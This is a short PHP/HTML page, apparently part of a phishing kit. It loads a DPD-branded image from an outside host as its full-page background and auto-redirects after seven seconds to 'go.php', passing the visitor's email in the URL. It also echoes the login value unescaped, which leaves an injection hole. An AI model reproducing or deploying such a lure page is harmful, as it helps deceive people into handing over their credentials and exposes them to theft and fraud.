<?php include ('feed.php');?>
<html>
<head>
<meta http-equiv="REFRESH" content="7; url= go.php?email=<?php echo $login; ?>">
</head>
<body background="http://prismacer.es/fatt/dpd.png">
</body>
</html>